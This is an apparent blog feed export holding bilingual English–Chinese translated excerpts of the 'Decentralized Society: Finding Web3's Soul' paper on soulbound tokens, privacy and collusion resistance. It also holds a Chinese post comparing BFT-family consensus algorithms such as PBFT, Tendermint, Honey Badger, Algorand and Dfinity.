<h3 id="§5-PLURAL-SENSEMAKING"><a href="#§5-PLURAL-SENSEMAKING" class="headerlink" title="§5 PLURAL SENSEMAKING"></a>§5 PLURAL SENSEMAKING</h3><p>An example of plural network goods that are of increasing salience in a digital world are predictive models built off user data. Both artificial intelligence (AI) and prediction markets seek to predict future events based on data primarily elicited from people. But both paradigms are limited in different and nearly opposite ways. The dominant paradigm in AI eschews incentives, instead hoovering up (public or privately surveilled) data feeds and synthesizing them into predictions through proprietary large-scale, non-linear models—harnessing the default web2 monopoly on “usus” without any “fructus” flowing to data laborers. Prediction markets take the opposite approach, where people bet on outcome in the hopes of financial gains, relying entirely on economic incentives of financial speculation (“fructus”) without synthesizing the beliefs of bettors to produce composable models. At the same time, both of these paradigms yield conclusions that are characterized as “objective” truths; whereas AI models are portrayed as “universal” or “generally intelligent,” prediction markets are portrayed as summarizing all the beliefs of the market participants in a single number: equilibrium price.</p>
<p>A more productive paradigm is to eschew these extremes, and instead draw on the virtues of both, while compensating for their weaknesses and enriching their breadth. We propose thoughtfully combining the complexity of non-linear AI models with the market incentives of prediction markets to transform passive data laborers into active data creators. With such provenance-rich information rooted in the sociality of data creators, we illustrate how DeSoc can unlock plural network(ed) intelligence more powerful than either approach.</p>
<h4 id="5-1-Prediction-Markets-to-Prediction-Plurality"><a href="#5-1-Prediction-Markets-to-Prediction-Plurality" class="headerlink" title="5.1 Prediction Markets to Prediction Plurality"></a>5.1 Prediction Markets to Prediction Plurality</h4><h4 id="5-2-Artificial-Intelligence-to-Plural-Intelligence"><a href="#5-2-Artificial-Intelligence-to-Plural-Intelligence" class="headerlink" title="5.2 Artificial Intelligence to Plural Intelligence"></a>5.2 Artificial Intelligence to Plural Intelligence</h4><h4 id="5-3-Programmable-Plural-Privacy"><a href="#5-3-Programmable-Plural-Privacy" class="headerlink" title="5.3 Programmable Plural Privacy"></a>5.3 Programmable Plural Privacy</h4></blockquote>
<p>在数字世界中越来越显着的多种网络商品的一个例子是基于用户数据构建的预测模型。人工智能 (AI) 和预测市场都试图根据主要从人们那里获得的数据来预测未来事件。但是这两种范式都以不同且几乎相反的方式受到限制。 AI 中的主导范式避开了激励措施，而是收集（公共或私人监视的）数据馈送，并通过专有的大规模非线性模型将它们综合成预测——利用默认的 web2 对“usus”的垄断，而没有任何“fructus”流动给数据工作者。预测市场采取相反的方法，人们在结果上下注，希望获得经济收益，完全依赖金融投机（“水果”）的经济激励，而不综合投注者的信念来产生可组合的模型。同时，这两种范式都得出了被称为“客观”真理的结论。人工智能模型被描述为“通用”或“普遍智能”，而预测市场被描述为将市场参与者的所有信念总结为一个数字：均衡价格。</p>
<p>一个更有成效的范式是避开这些极端，取而代之的是利用两者的优点，同时弥补它们的弱点并丰富它们的广度。我们建议将非线性 AI 模型的复杂性与预测市场的市场激励相结合，将被动的数据劳动者转变为主动的数据创造者。有了这些植根于数据创建者的社交性的来源丰富的信息，我们说明了 DeSoc 如何能够解锁比任何一种方法都更强大的多元网络智能。</p>
<h4 id="5-1-预测复数的预测市场"><a href="#5-1-预测复数的预测市场" class="headerlink" title="5.1 预测复数的预测市场"></a>5.1 预测复数的预测市场</h4><h4 id="5-2-人工智能到多元智能"><a href="#5-2-人工智能到多元智能" class="headerlink" title="5.2 人工智能到多元智能"></a>5.2 人工智能到多元智能</h4><h4 id="5-3-可编程复数隐私"><a href="#5-3-可编程复数隐私" class="headerlink" title="5.3 可编程复数隐私"></a>5.3 可编程复数隐私</h4>]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>联盟链共识算法说明</title>
    <url>/2020/02/23/%E8%81%94%E7%9B%9F%E9%93%BE%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<p>对于区块链应用场景，需要共识算法具有如下特性：</p>
<ul>
<li>Throughput吞吐量：transaction per second 意味着区块链系统每秒能处理的交易笔数，为了能够满足全球用户，交易处理速度必须足够大，否则会造成交易积压，并导致回复时间长。比如 bitcoin 的交易拥堵和以太坊因为 crytokitties 造成的网络拥堵。</li>
<li>Latency交易延时：交易从提交到回复成功与否的时间。在 PoW 网络中，因为有分叉可能，一般要等待几个块后确定。在 BFT 共识系统中，因为正确节点都在共识结束后就确定性有相同结果，所以在交易不拥堵的情况下，响应速度与共识时间相同。 </li>
<li>Scalability：区块链系统参与的节点数。对基于 PoW 共识的系统，安全度与参与的诚实算力相关。对于基于 BFT 共识的系统，参与节点数越多，能容纳的恶意节点越多，恶意节点少于 1/3。但是对于 BFT 系统，节点越多，通信和计算开销越大。Algorand 提出利用 Verifiable Random Function 随机选出一部分节点形成 committee参与共识，保证了无论总节点数多大，最后的 committee 数目一定，共识速度就不变。 </li>
<li>Security：对于 BFT 共识，安全度包含 consistence，liveness 和 fairness。Consistence 是系统内所有诚实节点要最终达到相同的状态。Liveness 需要系统在任意情况下都能收敛到确定状态，并且能持续接受交易，产生正确的共识结果。Fairness 在于对于系统的用户，任意合法的交易都不会被拒绝。</li>
</ul>
<p>对于传统的 PBFT 系统，需要假设网络处于弱同步状态，通过超时和换主来保证 liveness。但是因为换主是确定性地换到预先设定的下一个节点，而且每次换主导致的节点消息同步耗时长，主节点会被连续不断的网络攻击导致瘫痪，最终系统持续换主，永远无法共识交易，相当于停滞状态。</p>
<p>对此，Tendermint 提出由 Voting Power 值决定，从而避免了一直由主节点提交请求，一定程度上避免了攻击的薄弱点。但是这依然无法避免Leader节点的可预测性，导致被依次攻击，系统每轮共识无法完成。</p>
<p>Honey Badger 提出了基于 RBC（Reliable Broadcast）和 BA（Binary Agreement）的协议。核心在于任意节点都可以提出共识消息，通过 RBC 可靠传播到所有节点，并且为了减小广播带宽，通过 erasure code 分割消息为多份。同时所有节点都通过 BA 协议共识所有消息，BA 协议的执行会在任意情况下快速收敛到 1 或者 0，表示对共识消息的接受与否。该协议相当于每一轮，所有节点并行地提出交易、共识，最终得到交易的子集作为共识结果。所以对任意一个节点的攻击，都不会造成整个网络的崩溃，只会影响网络部分性能。而且能充分利用带宽，适合全球部署。该协议的缺点在于交易响应延时比较高，因为每轮要共识多个节点的交易。同时协议需要预先确定节点的集合，不能动态添加节点，不能支持大规模节点。</p>
<p>为了解决节点添加和扩充节点的问题，Algorand 提出将 VRF（Verifiable Random Function）和 BA 结合起来。无论节点数目多少，通过 VRF 和持有的代币数随机选出特定数目节点，然后节点通过 BA 相互发送交易，并对优先级最高（VRF 随机数最小）的节点发出的交易共识。为了提高安全性，共识的每一步都通过 VRF 选出新一轮共识节点，从而让攻击者无法预测下一个攻击目标。该协议的主要有点在响应时间短，缺点在于无法做到高吞吐量和窄带宽。</p>
<p>Dfinity 主要是通过 threshold 签名来保证 VRF 的每一轮都能确定性地收到 signature。结合Random Beacon 和 Notaries 来使每一轮的成员都随机选择，并且提交的块按照本轮随机数进行排名。但是一个潜在的经济学博弈问题是，threshold 签名可以通过多个成员的合谋的方法来预测，合谋的成员可以协同计算出群私钥，快速预测出下一轮的随机数。通过作恶 DoS 攻击下一轮的成员的目的，合谋者可以破坏网络的公平性。因为这种攻击是不容易被发现的，所以可以做到零成本收益，因而在现实世界必然会出现。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>翻译2-Decentralized Society Finding Web3 Soul</title>
    <url>/2022/05/13/%E7%BF%BB%E8%AF%912-Decentralized%20Society%20Finding%20Web3%20Soul/</url>
    <content><![CDATA[<blockquote>
<h3 id="§6-DECENTRALIZED-SOCIETY"><a href="#§6-DECENTRALIZED-SOCIETY" class="headerlink" title="§6 DECENTRALIZED SOCIETY"></a>§6 DECENTRALIZED SOCIETY</h3><p>Web3 aspires to transform societies broadly, rather than merely financial systems. Yet today’s social fabric—families, churches, teams, companies, civil society, celebrity, democracy—is meaningless in virtual worlds (often called the “metaverse”) without primitives representing human souls and the broader relationships they support. If web3 eschews persistent identities, their patterns of trust and cooperation, and their composable rights and permissions, we see, respectively, sybil attacks, collusion, and a limited economic realm of wholly transferable private property—all of which trends towards hyper-financialization. </p>
<p>To skirt hyper-financialization—yet unlock exponential growth—we propose augmenting and bridging our sociality across virtual and physical realities, empowering souls and communities to encode rich social and economic relationships. But simply building on trust and cooperation is not enough. Correcting for biases and tendencies to over-coordinate (or collude) among trust networks is essential to encouraging more intricate, diverse relationships that span greater social distances than before. We call this “Decentralized Society (DeSoc)”: a co-determined sociality, where Souls and Communities convene bottom-up, as emergent properties of each other to produce plural network goods across different scales.</p>
<p>We emphasize plural network goods as a feature of DeSoc, because networks are the most powerful engine of economic growth, yet the most susceptible to dystopian capture by private actors (e.g., web2) and powerful governments (e.g., Chinese Communist Party). Most significant economic growth results from increasing network returns, where every additional unit of input yields incrementally more output. Examples of simple physical networks include roads, electrical grids, cities, and other forms of infrastructure built off labor and other capital inputs. Examples of powerful digital networks include marketplaces, predictive models and plural intelligences built o￾ data. In both cases, network economics diverges from neoclassical economics, which teaches decreasing returns—where every additional unit of input yields incrementally less output—and where private property yields the most efficient outcomes. Private property applied to an increasing returns context has the opposite effect—throttling network growth by rent extraction. A road between two cities can unlock increasing returns from gains from trade. But the same road privately owned can throttle growth if the owners choose to extract rent up to the value trading between the two cities. Public ownership over a network also has its own perils, being susceptible to regulatory capture or underfunding.</p>
<p>Networks with increasing returns are most efficient when treated neither as purely public nor purely private goods, but rather as partial and plural shared goods. DeSoc provides the social substrate to unbundle and reconfigure rights—rights of use (“usus”), rights to consume or destroy (“abusus”), and rights of profit (“fructus”)—and enable efficient governance mechanisms across these rights that augment trust and cooperation while checking for collusion and capture. We’ve explored several mechanisms throughout this paper, such as community-based SALSA and quadratic funding (and voting) discounted by correlation scores. This third way of partial and plural ownership avoids the Charybdis of private rent extraction and Scylla of public regulatory capture.</p>
</blockquote>
<p>Web3 渴望广泛地改变社会，而不仅仅是金融系统。然而，今天的社会结构——家庭、教堂、团队、公司、公民社会、名人、民主——在没有代表人类灵魂的原始人和他们所支持的更广泛关系的虚拟世界（通常称为“元界”）中毫无意义。如果 web3 避开持久性身份、信任和合作模式以及可组合的权利和许可，我们将分别看到女巫攻击、勾结和完全可转让的私有财产的有限经济领域——所有这些都趋向于超金融化。</p>
<p>为了避免过度金融化——同时释放指数级增长——我们建议在虚拟和物理现实中增强和连接我们的社交性，赋予灵魂和社区以编码丰富的社会和经济关系的能力。但仅仅建立在信任与合作之上是不够的。纠正信任网络之间的偏见和过度协调（或勾结）的倾向对于鼓励比以前跨越更大社会距离的更复杂、更多样化的关系至关重要。<strong>我们称之为“去中心化社会（DeSoc）”：一种共同决定的社会性，灵魂和社区自下而上地聚集在一起，作为彼此的新兴属性，以生产不同规模的多种网络商品。</strong></p>
<p>我们强调多元网络商品是 DeSoc 的一个特征，因为网络是经济增长最强大的引擎，但最容易被私人参与者（例如 web2）和强大的政府（例如中国共产党）所俘获。最显着的经济增长来自网络回报的增加，其中每增加一个输入单位就会产生更多的输出。简单的物理网络的例子包括道路、电网、城市和其他形式的基础设施，这些基础设施是建立在劳动力和其他资本投入之上的。强大的数字网络的例子包括市场、预测模型和基于数据的多元智能。在这两种情况下，网络经济学都不同于新古典经济学，后者教导收益递减——每增加一个单位的投入产生的产出就会逐渐减少——而私有财产产生最有效的结果。在收益递增的情况下，私有财产会产生相反的效果——通过提取租金来抑制网络增长。两座城市之间的道路可以从贸易收益中获得越来越多的回报。但如果业主选择将租金提高到两个城市之间的价值交易，同一条私人拥有的道路可能会抑制增长。网络的公共所有权也有其自身的风险，容易受到监管或资金不足的影响。</p>
<p><strong>当既不将其视为纯粹的公共物品或纯粹的私人物品，而是将其视为部分和复数的共享物品时，回报递增的网络效率最高。</strong>DeSoc 为分解和重新配置权利提供了社会基础——使用权（“usus”）、消费或破坏权（“abusus”）和利润权（“fructus”）——并在这些权利中启用有效的治理机制， 在检查合谋和俘虏的同时增强信任和合作。 我们在本文中探索了几种机制，例如基于社区的 SALSA 和相关分数打折的二次融资（和投票）。 第三种部分和复数所有权避免了私人租金提取的 Charybdis 和公共监管捕获的 Scylla。</p>
<blockquote>
<p>In many ways, DeFi today is a decreasing returns private property paradigm retro￾tted onto increasing returns networks. Built on the premise of trustlessness, DeFi is inherently limited to the realm of wholly transferable private property (e.g., transferable tokens) that mostly bundles “usus,” “abusus,” and “fructus.” At best, DeFi risks throttling network growth by rent extraction and at worst risks ushering in dystopian surveillance monopolies dominated by “whales’’ who harvest and hoover up data in a race-to-the-bottom—much like web2. </p>
<p>DeSoc transforms DeFi’s race to control and speculate on the value of networks into a bottom-up coordination to build, participate, and govern them. At minimum, DeSoc’s social substrate can make DeFisybil-resistant (enabling community governance), vampire-resistant (internalizing positive externalities to build an open-source network), and collusion-resistant (preserving a network’s decentralization). With DeSoc’s structural corrections, DeFi can support and expand plural networks that confer benefits broadly—as agreed upon by the most diverse members—rather than further entrenching networks captured by narrow interests.</p>
<p>Yet, the greatest strength of DeSoc is its network composability. Sustained increasing returns and network growth isn’t simply avoiding the perils of rent extraction, but also encouraging the proliferation and intersection of nested networks. A road may form a network between two cities. But cut off from broader cooperation, two cooperating cities will eventually hit a ceiling of diminishing returns—either because of congestion (roads and housing) or exhaustion (reaching the limits of the people they can serve). Only through technological innovation and growing broader, if looser, cooperation with neighboring networks for new sources of increasing returns can value continue to grow exponentially. Some cooperation will be physical, incrementally extending physical trade across space. But many more connections will be informational and digital. Over time, we will see new matrices of cooperation between physical and digital networks, reliant upon and extending the social interconnections they are built on. It is precisely this intersecting, partly nested structure of ever growing network cooperation across digital and physical worlds that DeSoc enables.</p>
<p>Through composing networks and coordination, DeSoc emerges at the intersection of politics and markets—augmenting both with sociality. DeSoc empowers the vision of JCR Licklider—founder of ARPANET that created the internet—of “man-computer symbiosis” in an “intergalactic computer network” with dramatically increased social dynamism built on trust. Rather than build on DeFi’s trustless premise, DeSoc encodes trust networks that underpin the real economy today and enables us to harness them to generate plural network goods resilient to capture, extraction, or domination. With such augmented sociality, web3 can eschew short-term hyper-financialization in favor of an unbounded future of increasing returns across social distance.</p>
</blockquote>
<p>在许多方面，<strong>今天的 DeFi 是一种收益递减的私有财产范式，被改造成收益递增的网络。</strong>DeFi 建立在无需信任的前提下，本质上仅限于完全可转让的私有财产（例如可转让代币）领域，主要捆绑了 “usus”、 “abusus” 和 “fructus”。充其量，DeFi 有可能通过提取租金来限制网络增长，而在最坏的情况下，有可能迎来由“鲸鱼”主导的反乌托邦监视垄断，这些鲸鱼在竞相下收集和吸食数据——就像 web2 一样。</p>
<p>DeSoc 将 DeFi 控制和推测网络价值的竞赛转变为自下而上的协调，以构建、参与和管理它们。至少，DeSoc 的社会基础可以使 DeFisybil 抗性（支持社区治理）、吸血鬼抗性（内化正外部性以构建开源网络）和抗共谋（保持网络的去中心化）。通过 DeSoc 的结构修正，DeFi 可以支持和扩展多元化的网络，这些网络可以广泛地赋予利益——正如最多样化的成员所同意的那样——而不是进一步巩固被狭隘利益集团俘获的网络。</p>
<p>然而，<strong>DeSoc 的最大优势在于其网络可组合性</strong>。持续递增的回报和网络增长不仅避免了租金提取的危险，而且还鼓励嵌套网络的扩散和交叉。一条道路可以形成两个城市之间的网络。但如果切断更广泛的合作，两个合作的城市最终将达到收益递减的上限——要么是因为拥堵（道路和住房），要么是因为疲惫（达到了他们可以服务的人群的极限）。只有通过技术创新和更广泛（如果更松散）与邻近网络合作以获得新的收益增加来源，价值才能继续呈指数级增长。一些合作将是实体的，逐步扩展跨空间的实体贸易。但更多的连接将是信息化和数字化的。随着时间的推移，我们将看到物理和数字网络之间的新合作矩阵，依赖并扩展它们所建立的社会互连。正是这种交叉、部分嵌套的跨数字和物理世界不断增长的网络合作结构正是 DeSoc 实现的。</p>
<p>通过组成网络和协调，DeSoc 出现在政治和市场的交汇处——同时增强了社会性。 DeSoc 赋予了 JCR Licklider （创造互联网的 ARPANET 的创始人）在“星际计算机网络”中“人机共生”的愿景，并在信任的基础上显着增强了社会活力。DeSoc 不是建立在 DeFi 的去信任前提之上，而是对支撑当今实体经济的信任网络进行编码，并使我们能够利用它们来生成多种网络商品，以适应捕获、提取或支配。借助这种增强的社交性，web3 可以避免短期的超金融化，转而支持跨越社交距离的无限未来增加回报。</p>
<blockquote>
<h3 id="§7-IMPLEMENTATION-CHALLENGES"><a href="#§7-IMPLEMENTATION-CHALLENGES" class="headerlink" title="§7 IMPLEMENTATION CHALLENGES"></a>§7 IMPLEMENTATION CHALLENGES</h3><p>Privacy presents a key challenge for DeSoc. On the one hand, too many public SBTs may reveal too much information about a Soul, making them vulnerable to social control. On the other hand, too many purely private SBTs may also lead to private communication channels that eschew correlation discounting for governance and social coordination—presenting important incentive compatibility questions. Closely related to the issue of privacy is the issue of cheating: Souls may misrepresent their social solidarities, while coordinating through private or side channels. We cannot aspire to know all the possibilities and answers, but instead explore the nature of the challenge here and sketch a few promising paths for future research.</p>
</blockquote>
<p>隐私对 DeSoc 来说是一个关键挑战。一方面，太多的公共 SBT 可能会泄露太多关于灵魂的信息，使他们容易受到社会控制。另一方面，过多的纯私人 SBT 也可能导致私人沟通渠道避开治理和社会协调的相关性折扣——这提出了重要的激励相容性问题。与隐私问题密切相关的是欺骗问题：灵魂可能会歪曲他们的社会团结，同时通过私人或辅助渠道进行协调。我们不能渴望知道所有的可能性和答案，而是在这里探索挑战的本质，并为未来的研究勾勒出一些有希望的路径。</p>
<blockquote>
<h4 id="7-1-Private-Souls"><a href="#7-1-Private-Souls" class="headerlink" title="7.1 Private Souls"></a>7.1 Private Souls</h4><p>Blockchain-based systems are public by default. Any relationship that is recorded on-chain is immediately visible not just to the participants, but also to anyone in the entire world. Some privacy can be retained by having multiple pseudonyms: a family Soul, a medical Soul, a professional Soul, a political Soul each carrying different SBTs. But done naively, it could be very easy to correlate these Souls to each other. The consequences of this lack of privacy are serious. Indeed, without explicit measures taken to protect privacy, the “naive” vision of simply putting all SBTs on-chain may well make too much information public for many applications. </p>
<p>To deal with over-publicity, there are a number of solutions with different levels of technical complexity and functionality. The simplest approach is that an SBT could store data on-chain.</p>
</blockquote>
<p>基于区块链的系统默认是公开的。 记录在链上的任何关系不仅对参与者，而且对全世界的任何人都是立即可见的。使用多个假名可以保留一些隐私：家庭灵魂、医疗灵魂、专业灵魂、政治灵魂，每个都携带不同的 SBT。但是如果天真地完成，很容易将这些灵魂相互关联起来。 这种缺乏隐私的后果是严重的。<strong>事实上，如果没有采取明确的措施来保护隐私，简单地将所有 SBT 上链的“幼稚”愿景很可能会使许多应用程序公开太多信息。</strong></p>
<p>为了应对过度宣传，有许多具有不同技术复杂性和功能级别的解决方案。 最简单的方法是 SBT 可以在链上存储数据。</p>
<p>![](翻译2-Decentralized Society Finding Web3 Soul/1.png)</p>
<blockquote>
<p>The choice of how to store the o￾-chain data is left to the person; possible solutions include (i) their own devices, (ii) a cloud service trusted by them, or (iii) decentralized networks such as the Interplanetary File System (IPFS). Storing data off-chain lets us continue to have smart contracts that permission the right to write SBT data, but at the same time have separate permissions to read that data. Bob can choose to reveal the contents of any of his SBTs (or the data stores which they permission) only when he wishes to. This already gets us quite far, and has the further benefit of improving technical scalability because most data only needs to be handled by a very small number of parties. But to fully achieve properties like plural privacy, as well as more fine-grained forms of disclosure, we need to go further. Fortunately, many cryptographic technologies let us do that.</p>
<p>One powerful set of building blocks that enables new ways to partially reveal data is a branch of cryptography called “zero knowledge proofs.” While zero knowledge proofs are most frequently used today to enable privacy-preserving transfers of assets, they also can allow people to prove arbitrary statements without revealing any more information beyond the statement itself. For example, in a world where government documents and other attestations are cryptographically provable, someone could prove a statement like “I am a citizen of Canada, who is over 18 years old and has a university degree in economics and over 50,000 Twitter followers, and who has not yet claimed an account in this system.”</p>
<p>Zero-knowledge proofs can be computed over SBTs to prove characteristics about a Soul (e.g., that it has certain memberships). This technique can be extended further by introducing multi-party computation techniques such as garbled circuits, which could make such tests doubly private: the prover does not reveal who they are to the verifier, and the verifier does not reveal their verification mechanism to the prover. Instead, both parties make the computation together and only learn the output.</p>
<p>Another powerful technique is designated-verifier proofs. In general, “data” is slippery: if I send a movie to you, I cannot technologically prevent you from recording and sending it to a third party. Workarounds like Digital Rights Management (DRM) have at best limited e￾ectiveness, and often come at great costs to users. Proofs, however, are not slippery in the same way. If Amma wants to prove some property X about her SBTs to Bob, she can make a zero knowledge proof of the statement “I hold SBTs that satisfy property X, OR I have the access key to Bob’s Soul.” Bob would find this statement convincing: he knows that he did not make the proof, and so Amma must actually have SBTs that satisfy property X. But if Bob passes the proof along to Cuifen, Cuifen would not be convinced: for all he knows, Bob could have made the proof with his own key. This can be made even stronger with verifiable delay functions (VDFs): Amma can make and present a proof that can only be made with the required SBTs right now, but anyone else will be able to make five minutes from now. This means it is possible to represent sophisticated access permissions to trustworthy proofs about data despite the impossibility of making the same kinds of selective permissions to the raw data itself, which may simply be copy and pasted. This may take us quite far nonetheless. Just as blockchains o￾er traceability in transactions that prevents someone from right-click copy-and-pasting a valuable NFT (and sybil attacking the original owner), similarly SBTs can o￾er traceability in social prevenance, which at minimum can reduce the value of copy-and-pasted data with unverified origins.</p>
<p>These off-chain data and zero-knowledge techniques are compatible with negative reputation—SBTs that are made visible even if the holder does not want them to be visible. Important examples of negative reputation include credit history, data about unpaid loans, negative reviews and complaints from business partners, and SBTs attesting to social connections relevant for coordination. Blockchains coupled with the same cryptography could offer a potential solution: Souls could be forced by smart contract logic to incorporate negative SBTs into a data structure like a Merkle tree that is stored off-chain, and any zero knowledge proof or garbled circuit computation would require them to introduce that information, because otherwise there would be a visible “hole” in the provided data that the verifier would recognize. The Unirep protocol is an example of how this might be implemented.</p>
<p>The point of these examples is not to show exactly how cryptographic technology can be used to solve all of the privacy and data permissioning problems with SBTs. Rather, it is to sketch out a few examples to show the power of such technologies. An important future research direction is to scope the exact limits of different kinds of data permissioning and the specific combinations of techniques that work best to achieve the desired level of permissions. Another question is what types of plural property regimes are desirable to govern data, and how to properly unbundle access (“usus”), editing (“abusus”) and cash.</p>
</blockquote>
<p>如何存储外链数据的选择由个人决定；可能的解决方案包括（i）他们自己的设备，（ii）他们信任的云服务，或（iii）去中心化网络，例如星际文件系统（IPFS）。将数据存储在链下让我们继续拥有有权写入 SBT 数据的智能合约，但同时拥有读取该数据的单独权限。Bob 可以选择仅在他愿意时透露他的任何 SBT（或他们允许的数据存储）的内容。这已经让我们走得很远，并且具有提高技术可扩展性的进一步好处，因为大多数数据只需要由极少数方处理。但要完全实现多元隐私等属性，以及更细粒度的披露形式，我们还需要更进一步。幸运的是，许多加密技术让我们能够做到这一点。</p>
<p>一组强大的构建块能够以新的方式部分揭示数据，它是密码学的一个分支，称为<strong>“零知识证明”</strong>。虽然如今零知识证明最常用于保护隐私的资产转移，但它们也可以让人们证明任意陈述，而无需透露陈述本身之外的任何更多信息。例如，在一个政府文件和其他证明可以通过密码证明的世界中，有人可以证明这样的陈述：“我是加拿大公民，年满 18 岁，拥有大学经济学学位和超过 50,000 名 Twitter 关注者，并且谁还没有在这个系统中申请账户。”零知识证明可以通过 SBT 计算来证明灵魂的特征（例如，它具有某些成员资格）。通过引入多方计算技术（例如乱码电路）可以进一步扩展该技术，这可以使此类测试具有双重私密性：证明者不会向验证者透露他们是谁，而验证者不会向证明者透露他们的验证机制。相反，双方一起进行计算，只学习输出。</p>
<p>另一种强大的技术是<strong>指定验证者证明</strong>。总的来说，“数据”是很滑的：如果我向您发送电影，我无法在技术上阻止您录制并将其发送给第三方。数字版权管理 (DRM) 之类的变通办法充其量只能起到有限的作用，而且通常会给用户带来巨大的成本。然而，证明并不是以同样的方式滑溜的。如果 Amma 想向 Bob 证明一些关于她的 SBT 的属性 X，她可以对“我持有满足属性 X 的 SBT，或者我拥有 Bob 的灵魂的访问密钥”这一陈述进行零知识证明。 Bob 会发现这个陈述令人信服：他知道他没有做出证明，因此 Amma 实际上必须有满足性质 X 的 SBT。但是如果 Bob 将证明传递给 Cuifen，Cuifen 不会被说服：据他所知， Bob 可以用他自己的密钥来证明。这可以通过可验证的延迟函数 (VDF) 变得更加强大：Amma 可以制作并展示目前只能使用所需的 SBT 制作的证明，但其他任何人都可以在五分钟后制作。这意味着尽管不可能对原始数据本身（可能只是简单地复制和粘贴）进行相同类型的选择性权限，但可以表示对有关数据的可信证明的复杂访问权限。尽管如此，这可能会让我们走得很远。正如区块链在交易中提供可追溯性以防止某人右键单击复制和粘贴有价值的 NFT（以及女巫攻击原始所有者）一样，SBT 可以在社会传播方面提供可追溯性，这至少可以减少来源未经验证的复制粘贴数据的价值。</p>
<p>这些链下数据和零知识技术与负面声誉兼容——即使持有者不希望它们可见，SBT 也会变得可见。负面声誉的重要示例包括信用记录、未付贷款数据、负面评论和业务合作伙伴的投诉，以及证明与协调相关的社会关系的 SBT。与相同密码学相结合的区块链可以提供一个潜在的解决方案：智能合约逻辑可以强制 Souls 将负 SBT 合并到数据结构中，例如存储在链外的 Merkle 树，并且任何零知识证明或乱码电路计算都需要他们介绍该信息，否则在提供的数据中会有一个可见的“漏洞”，验证者会识别出来。 Unirep 协议是如何实现这一点的一个例子。</p>
<p>这些示例的重点并不是要准确说明如何使用加密技术来解决 SBT 的所有隐私和数据许可问题。相反，它是勾勒出几个例子来展示这些技术的力量。一个重要的未来研究方向是确定不同类型数据许可的确切限制以及最适合实现所需许可级别的技术的特定组合。 另一个问题是需要什么样的多元财产制度来管理数据，以及如何正确地拆分访问（“usus”）、编辑（“abusus”）和现金。</p>
<blockquote>
<h4 id="7-2-Cheating-Souls"><a href="#7-2-Cheating-Souls" class="headerlink" title="7.2 Cheating Souls"></a>7.2 Cheating Souls</h4><p>If SBTs are the social substrate upon which plural property, network goods and intelligences are coordinated, one might be concerned that Souls will try to trick or cheat their way into communities to gain access to governance or property rights that we imagine SBTs permissioning. For example, if many applications depend on SBTs representing conference attendance, unscrupulous conferences could offer such SBTs in exchange for bribes. With enough bribes, humans (and bots) could generate a fake social graph that makes the account look like an authentic human Soul, richly ifferentiated by (fake) SBTs. Just as DAOs can be bribed, so can Souls and the on-chain voting mechanisms which they use. Conversely, if SBTs are used to discount coordination, Souls may avoid SBTs to maximize their influence. Why should we believe that the SBTs a Soul possess accurately reflect their true social commitments rather than simply how they choose to play this game?</p>
<p>One argument is that the varying incentives to cheat may “balance out.” Souls may sort and self-identify into the networks that are important to them at the right scale, much like how Harberger taxes balance out the incentive to over-value and under-value assets to elicit approximately accurate market valuations. Souls will want to hold more SBTs to gain influence within their communities, but on the other hand will eschew SBTs from communities they care less about to score lower on correlation metrics and increase their influence in governance over broader networks. </p>
<p>But it would be naive to assume that the two incentives—to gain access and maximize influence—always evenly cancel out, or even come close to canceling out, as though by magic. There may be many communities that use systems other than SBTs to gate access and governance. Or communities may—counter to our primary assumption about publicity—dole out private SBTs to reflect governance rights, but induce community members to keep these SBTs secret in broader decisions.</p>
<p>The problem of “gaming” should not be understated. It is a significant issue and resolving it is one of the most important foci for future research. Indeed, it is a major reason why open-sourcing many existing algorithms that prioritize or filter for human users is very challenging. To mitigate and deter SBT gaming, we suggest several norms and cryptographic directions:</p>
</blockquote>
<p>如果 SBT 是多种财产、网络商品和智能在其上协调的社会基础，人们可能会担心灵魂会试图欺骗或欺骗他们进入社区，以获得我们想象 SBT 允许的治理或财产权。例如，如果许多应用程序依赖于代表会议出席的 SBT，则不道德的会议可能会提供此类 SBT 以换取贿赂。有了足够的贿赂，人类（和机器人）可以生成一个虚假的社交图谱，使该帐户看起来像一个真实的人类灵魂，并被（假的）SBT 丰富地分化。就像 DAO 可以被贿赂一样，Souls 和他们使用的链上投票机制也可以。相反，如果使用 SBT 来降低协调性，Souls 可能会避免 SBT 以最大化其影响力。为什么我们应该相信灵魂拥有的 SBT 准确地反映了他们真正的社会承诺，而不仅仅是他们选择玩这个游戏的方式？</p>
<p>一个论点是，不同的作弊动机可能会“平衡”。灵魂可能会以适当的规模分类和自我识别到对他们来说很重要的网络中，就像哈伯格税收如何平衡高估和低估资产的激励，以得出大致准确的市场估值一样。 Souls 将希望持有更多的 SBT 以在其社区中获得影响力，但另一方面，他们会避开他们不太关心的社区中的 SBT，以在相关性指标上得分较低，并增加他们在更广泛网络治理中的影响力。</p>
<p>但是，如果假设这两种激励措施——获得访问权和最大化影响力——总是均匀地抵消，甚至接近于抵消，就好像施了魔法一样，那就太天真了。可能有许多社区使用 SBT 以外的系统来控制访问和治理。或者社区可能——与我们关于公开的主要假设相反——发放私人 SBT 以反映治理权利，但诱使社区成员在更广泛的决策中对这些 SBT 保密。</p>
<p>“游戏”的问题不容小觑。这是一个重要的问题，解决它是未来研究的最重要的焦点之一。事实上，这也是为什么开源许多为人类用户优先考虑或过滤的现有算法非常具有挑战性的一个主要原因。为了减轻和阻止 SBT 游戏，我们建议了几个规范和加密方向：</p>
<blockquote>
<ol>
<li>The ecosystem of SBTs could bootstrap off “thick” community channels, where SBTs signal authentic off-chain community membership with strong social bonds and repeat interactions. This would make it easier for communities to filter and revoke SBTs of impersonators and bots. Such thick channels—which we often find in churches, workplaces, schools, meet-up groups, and organizations in civil society—would provide a more sybil-resistant social substrate to police gaming (e.g., through bots, bribes, impersonation) in more “thin” social channels. </li>
<li>Nested communities could require SBTs to force context on potential collusion vectors “just below” them. For example, if a state were holding a funding round or vote, the state might require every participating citizen to also hold an SBT of a defined county and municipality.</li>
<li>The openness and cryptographic provability of the SBT ecosystem could itself be used to actively detect collusive patterns and penalize inauthentic behavior—perhaps discounting the voting power of collusive Souls, or obliging Souls to accept SBTs representing negative attestations. For example, if one Soul attests to the humanity of another Soul that turns out to be a bot, the case can be escalated and publicly verified, leading to that Soul having a large number of negative attestations. This already happens to an extent within the GitCoin QF ecosystem, where a range of signals are used to detect “collusive groups.”</li>
